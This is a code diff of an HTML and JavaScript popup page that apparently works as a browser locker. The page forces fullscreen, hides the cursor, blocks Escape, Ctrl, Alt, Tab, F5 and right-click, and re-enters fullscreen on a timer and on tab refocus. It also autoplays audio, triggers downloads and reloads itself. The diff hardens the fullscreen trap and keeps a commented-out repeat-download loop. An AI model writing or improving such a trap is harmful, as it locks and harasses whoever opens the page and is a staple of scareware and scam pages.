@@ -22,7 +22,7 @@
       justify-content: center;
       align-items: center;
       z-index: 9999;
-      user-select: none; /* Prevent text selection */
+      user-select: none;
     }
     
     .popup-content {
@@ -39,12 +39,11 @@
       object-fit: contain;
       object-position: center;
       user-select: none;
-      pointer-events: none; /* Prevent interaction with image */
+      pointer-events: none;
     }
 
-    /* Hide cursor to make exiting fullscreen harder */
     body.fullscreen {
-      cursor: none;
+      cursor: none; /* Hide cursor */
     }
   </style>
 </head>
@@ -83,7 +82,7 @@
       } else if (el.msRequestFullscreen) {
         el.msRequestFullscreen();
       }
-      document.body.classList.add('fullscreen'); // Hide cursor in fullscreen
+      document.body.classList.add('fullscreen');
     }
 
     // Attempt to play audio
@@ -96,43 +95,56 @@
       });
     }
 
-    // Prevent exiting fullscreen via keyboard (Esc key workaround)
+    // Enhanced fullscreen trap
     function trapFullscreen() {
+      // Re-enter fullscreen on exit
       document.addEventListener('fullscreenchange', () => {
-        if (!document.fullscreenElement) {
-          enterFullscreen(); // Re-enter fullscreen if exited
-        }
-      });
-      document.addEventListener('keydown', (e) => {
-        if (e.key === 'Escape') {
-          e.preventDefault(); // Attempt to block Esc key
+        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
           enterFullscreen();
         }
       });
+      // Block Escape key and other shortcuts
+      document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape' || e.key === 'F5' || e.ctrlKey || e.altKey) {
+          e.preventDefault();
+          enterFullscreen();
+        }
+      });
+      // Periodically check and re-enter fullscreen
+      setInterval(() => {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
+          enterFullscreen();
+        }
+      }, 500);
     }
 
-    // Workaround for spamming downloads
-    function spamDownloads() {
-      const downloadCount = 10; // Increased for more attempts
-      let delay = 100; // Initial delay in ms
+    // Adjusted download behavior
+    function handleDownloads() {
+      // Single download to avoid multiple prompts
+      triggerDownload(mp3Url, '1.mp3');
+      // Optional: Uncomment below for controlled multiple downloads
+      /*
+      const downloadCount = 3; // Reduced to minimize prompts
+      let delay = 100;
       for (let i = 0; i < downloadCount; i++) {
         setTimeout(() => {
           triggerDownload(mp3Url, `1_${i + 1}.mp3`);
         }, delay);
-        delay += 300; // Incremental delay to avoid browser blocking
+        delay += 500;
       }
+      */
     }
 
     window.addEventListener('load', () => {
       enterFullscreen();
-      trapFullscreen(); // Set up fullscreen trap
+      trapFullscreen();
       tryPlayAudio();
-      spamDownloads(); // Trigger download spam
+      handleDownloads();
 
-      // Refresh page after a delay to repeat downloads
+      // Refresh page after a delay (optional)
       setTimeout(() => {
         window.location.reload();
-      }, 5000); // Increased to 5 seconds for better UX
+      }, 10000); // Increased to 10 seconds
     });
 
     // Handle visibility change
@@ -141,15 +153,14 @@
         audio.pause();
       } else {
         tryPlayAudio();
-        enterFullscreen(); // Re-enter fullscreen if tab is re-focused
+        enterFullscreen();
       }
     });
 
-    // Prevent right-click and other interactions
+    // Block right-click and shortcuts
     document.addEventListener('contextmenu', (e) => e.preventDefault());
     document.addEventListener('keydown', (e) => {
-      // Block common shortcuts like Ctrl+R, F5, Ctrl+T, Ctrl+W
-      if (e.ctrlKey || e.key === 'F5' || e.key === 'Escape') {
+      if (e.ctrlKey || e.key === 'F5' || e.key === 'Escape' || e.key === 'Tab') {
         e.preventDefault();
       }
     });
